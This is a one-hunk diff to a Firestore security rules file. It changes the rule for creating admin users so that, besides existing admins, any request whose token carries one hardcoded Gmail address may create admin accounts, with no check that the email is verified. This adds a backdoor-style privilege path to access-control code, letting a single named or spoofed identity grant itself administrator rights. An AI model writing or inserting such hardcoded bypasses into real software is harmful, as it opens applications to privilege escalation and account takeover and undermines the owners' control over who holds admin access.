@@ -162,7 +162,7 @@ service cloud.firestore {
     // Admin Users
     match /adminUsers/{userId} {
       allow get: if isSignedIn() && request.auth.uid == userId; // Allow users to check if they are admins
-      allow create: if isAdmin() && isValidId(userId) && isValidAdminUser(incoming()) && incoming().createdAt == request.time;
+      allow create: if (isAdmin() || request.auth.token.email == 'hk28737372@gmail.com') && isValidId(userId) && isValidAdminUser(incoming()) && incoming().createdAt == request.time;
       allow update: if isAdmin() && isValidId(userId) && isValidAdminUser(incoming()) 
                      && incoming().createdAt == existing().createdAt 
                      && incoming().updatedAt == request.time;
